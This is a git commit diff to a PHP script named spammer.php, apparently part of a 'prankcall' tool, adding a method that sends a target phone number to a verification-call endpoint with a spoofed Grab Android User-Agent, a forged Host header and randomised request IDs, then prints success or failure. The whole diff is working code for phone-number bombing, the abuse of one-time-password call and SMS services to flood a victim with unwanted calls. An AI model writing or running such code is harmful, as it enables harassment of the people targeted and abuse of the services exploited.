4e8b3155b8e2e8a290891c90eae5d25eefe25eb7
Risky Prsty <66415817+riskyprsty@users.noreply.github.com>
2020-10-17 07:39:48 +0700

    Adding some code

--- spammer.php
+++ spammer.php
@@ -76,6 +76,32 @@ class prankcall{
 			if($a>=$many) echo "\nDone lurr!\n";
 		}
 	}
+        private function njir(){
+		$no = $this->correct($this->number);
+		$rand = rand(0123456,9999999);
+		$rands = $this->randStr(12);
+		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
+		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
+		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
+		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
+		$h[] = "Content-Type: application/x-www-form-urlencoded";
+		$h[] = "Content-Length: ".strlen($post);
+		$h[] = "Host: api.grab.com";
+		$h[] = "Connection: close";
+		$ch = curl_init();
+		curl_setopt($ch, CURLOPT_URL, "https://api.smsfreegan.com/apinjir/?=");
+		curl_setopt($ch, CURLOPT_POST, 1);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		$x = curl_exec($ch); curl_close($ch);
+		$ekse = json_decode($x,true);
+		if(empty($ekse['challengeID'])){
+			echo "Gagal\n";
+		}else{
+			echo "Sukses\n";
+		}
+	}
 	private function randStr($l){
 		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
 		$word = "";
